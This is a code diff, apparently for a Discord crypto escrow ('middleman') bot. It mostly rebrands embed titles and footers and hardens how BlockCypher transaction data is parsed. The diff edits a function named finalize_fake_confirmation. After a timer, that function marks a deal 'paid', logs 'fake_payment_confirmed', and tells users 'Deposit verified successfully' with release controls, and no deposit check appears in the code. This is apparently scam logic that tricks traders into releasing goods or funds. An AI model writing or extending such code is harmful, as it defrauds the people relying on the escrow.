@@ -26,8 +26,8 @@ PAYMENT_POLL_INTERVAL_SECONDS = max(PAYMENT_POLL_INTERVAL_SECONDS, 10)
 WITHDRAW_CONFIRM_COOLDOWN_SECONDS = 180
 WITHDRAW_RETRY_BASE_SECONDS = 180
 WITHDRAW_RETRY_MAX_ATTEMPTS = 5
-SPARKLES_TITLE = "DOG AUTO MIDDLEMAN"
-SPARKLES_FOOTER = "Dog Escrow"
+SPARKLES_TITLE = "Dog Auto Middleman"
+SPARKLES_FOOTER = "Dog Auto Middleman"
 SENSITIVE_COMMAND_COOLDOWN_SECONDS = 8
 MIN_DEAL_USD = 0.1
 MAX_DEAL_USD = 50000.0
@@ -1308,11 +1308,11 @@ def build_commands_overview_pages(lines):
 async def send_commands_overview_pages(send_callable, pages):
     for index, page_lines in enumerate(pages, start=1):
         embed = discord.Embed(
-            title=SPARKLES_TITLE,
+            title="Dog Auto Mm Bot",
             description="**COMMAND LIST**\n" + "\n".join(page_lines),
             color=0x3498DB,
         )
-        embed.set_footer(text=f"{SPARKLES_FOOTER} | Auto-updated ({index}/{len(pages)})")
+        embed.set_footer(text=f"Dog Auto Mm Bot | Auto-updated ({index}/{len(pages)})")
         await send_callable(embed)
 
 
@@ -1339,11 +1339,11 @@ async def commands_overview_slash(interaction: discord.Interaction):
     pages = build_commands_overview_pages(lines)
     if not interaction.response.is_done():
         first_embed = discord.Embed(
-            title=SPARKLES_TITLE,
+            title="Dog Auto Mm Bot",
             description="**COMMAND LIST**\n" + "\n".join(pages[0]),
             color=0x3498DB,
         )
-        first_embed.set_footer(text=f"{SPARKLES_FOOTER} | Auto-updated (1/{len(pages)})")
+        first_embed.set_footer(text=f"Dog Auto Mm Bot | Auto-updated (1/{len(pages)})")
         await interaction.response.send_message(embed=first_embed, ephemeral=True)
         start_index = 2
     else:
@@ -1351,11 +1351,11 @@ async def commands_overview_slash(interaction: discord.Interaction):
 
     for page_index in range(start_index, len(pages) + 1):
         embed = discord.Embed(
-            title=SPARKLES_TITLE,
+            title="Dog Auto Mm Bot",
             description="**COMMAND LIST**\n" + "\n".join(pages[page_index - 1]),
             color=0x3498DB,
         )
-        embed.set_footer(text=f"{SPARKLES_FOOTER} | Auto-updated ({page_index}/{len(pages)})")
+        embed.set_footer(text=f"Dog Auto Mm Bot | Auto-updated ({page_index}/{len(pages)})")
         await interaction.followup.send(embed=embed, ephemeral=True)
 
 async def finalize_fake_confirmation(guild, ticket_id, msg, crypto, wait_seconds):
@@ -1368,11 +1368,11 @@ async def finalize_fake_confirmation(guild, ticket_id, msg, crypto, wait_seconds
         update_ticket(ticket_id, status="paid")
         await audit(guild, ticket_id, "fake_payment_confirmed", f"auto_confirm_after_{wait_seconds}s")
         embed = discord.Embed(
-            title=SPARKLES_TITLE,
+            title="Dog Auto Mm Bot",
             description="**PAYMENT CONFIRMED**\nDeposit verified successfully. Release controls are now ready.",
             color=0x10B981,
         )
-        embed.set_footer(text="Dog Escrow | Confirm delivery before releasing")
+        embed.set_footer(text="Dog Auto Mm Bot | Confirm delivery before releasing")
         release_msg = await msg.channel.send(embed=embed, view=ReleaseRefundView(ticket_id, crypto))
         update_ticket(ticket_id, message_id=release_msg.id)
     finally:
@@ -1523,7 +1523,7 @@ async def repair_release(ctx, channel_id: int = None):
         await audit(ctx.guild, ticket[0], "release_repaired_status", f"by={ctx.author.id} from={original_status} to=paid")
 
     embed = discord.Embed(
-        title=SPARKLES_TITLE,
+        title="Dog Auto Mm Bot",
         description=(
             f"**RELEASE FLOW REPAIRED**\nRelease controls have been restored for this ticket.\n\n"
             f"Buyer: <@{ticket[2]}>\n"
@@ -1533,7 +1533,7 @@ async def repair_release(ctx, channel_id: int = None):
         ),
         color=0x2ECC71,
     )
-    embed.set_footer(text=SPARKLES_FOOTER)
+    embed.set_footer(text="Dog Auto Mm Bot")
 
     repaired_msg = await target_channel.send(
         f"<@{ticket[2]}> <@{ticket[3]}>",
@@ -1574,7 +1574,7 @@ async def emergency_recover(ctx, channel_id: int = None):
             decrypted_key = f"DECRYPTION_FAILED: {exc}"
 
     recovery_embed = discord.Embed(
-        title=SPARKLES_TITLE,
+        title="Dog Auto Mm Bot",
         description="**EMERGENCY RECOVERY PACKAGE**\nHighly sensitive recovery details for this ticket.",
         color=0xE67E22,
     )
@@ -1729,11 +1729,11 @@ async def ticket_audit(ctx, channel_id: int = None):
     chain_status = "INTACT" if chain_ok else f"FAILED_AT_EVENT_{bad_index}"
     lines = [f"{created_at} | {event} | {details}" for event, details, created_at in events]
     embed = discord.Embed(
-        title=SPARKLES_TITLE,
+        title="Dog Auto Mm Bot",
         description=f"**TICKET AUDIT #{ticket[0]}**\nChain: `{chain_status}`\n" + "\n".join(lines[:10]),
         color=0x5865F2,
     )
-    embed.set_footer(text=SPARKLES_FOOTER)
+    embed.set_footer(text="Dog Auto Mm Bot")
     await ctx.send(embed=embed)
 
 
@@ -1845,7 +1845,15 @@ async def proof(ctx, *parts):
             ltc_amount = amount_value / ltc_price
             # Get recent LTC transactions (BlockCypher API)
             api_url = f"https://api.blockcypher.com/v1/ltc/main/txs"
-            txs = requests.get(api_url).json().get("txs", [])
+            txs_resp = requests.get(api_url)
+            txs_json = txs_resp.json() if txs_resp.ok else []
+            # BlockCypher sometimes returns a list, sometimes a dict with 'txs'
+            if isinstance(txs_json, list):
+                txs = txs_json
+            elif isinstance(txs_json, dict):
+                txs = txs_json.get("txs", [])
+            else:
+                txs = []
             found = None
             min_diff = float('inf')
             for tx in txs:
@@ -1949,11 +1957,11 @@ async def quota(ctx):
         f"Per-second: `{hits.get('api/second', 'n/a')}` / `{limits.get('api/second', 'n/a')}`",
     ]
     embed = discord.Embed(
-        title=SPARKLES_TITLE,
+        title="Dog Auto Mm Bot",
         description="**BLOCKCYPHER QUOTA**\n" + "\n".join(lines),
         color=0x3498DB,
     )
-    embed.set_footer(text=SPARKLES_FOOTER)
+    embed.set_footer(text="Dog Auto Mm Bot")
     await ctx.send(embed=embed)
 
 
@@ -1983,14 +1991,14 @@ async def backup_export(ctx):
     try:
         result = create_encrypted_backup_export()
         embed = discord.Embed(
-            title=SPARKLES_TITLE,
+            title="Dog Auto Mm Bot",
             description="**ENCRYPTED BACKUP EXPORT CREATED**\nStore this file in offsite storage.",
             color=0x10B981,
         )
         embed.add_field(name="Backup File", value=f"`{result.get('backup_path')}`", inline=False)
         embed.add_field(name="Encrypted Export", value=f"`{result.get('export_path')}`", inline=False)
         embed.add_field(name="SHA256 (plaintext)", value=f"`{result.get('sha256')}`", inline=False)
-        embed.set_footer(text=SPARKLES_FOOTER)
+        embed.set_footer(text="Dog Auto Mm Bot")
         await ctx.send(embed=embed)
     except Exception as exc:
         await ctx.send(f"Encrypted backup export failed: `{str(exc)[:900]}`")
@@ -2009,7 +2017,7 @@ async def security_status(ctx):
         age = snapshot.get("last_backup_age_seconds")
         age_text = "never" if age is None else f"{age}s ago"
         embed = discord.Embed(
-            title=SPARKLES_TITLE,
+            title="Dog Auto Mm Bot",
             description="**SECURITY STATUS**\nDatabase and key safety snapshot.",
             color=0x10B981,
         )
@@ -2023,7 +2031,7 @@ async def security_status(ctx):
         embed.add_field(name="Startup Max Backup Age", value=f"{BACKUP_STARTUP_MAX_AGE_MINUTES} min", inline=True)
         embed.add_field(name="DB Path", value=f"`{snapshot.get('db_path')}`", inline=False)
         embed.add_field(name="Backup Dir", value=f"`{snapshot.get('backup_dir')}`", inline=False)
-        embed.set_footer(text=SPARKLES_FOOTER)
+        embed.set_footer(text="Dog Auto Mm Bot")
         await ctx.send(embed=embed)
     except Exception as exc:
         await ctx.send(f"Security status check failed: `{str(exc)[:900]}`")
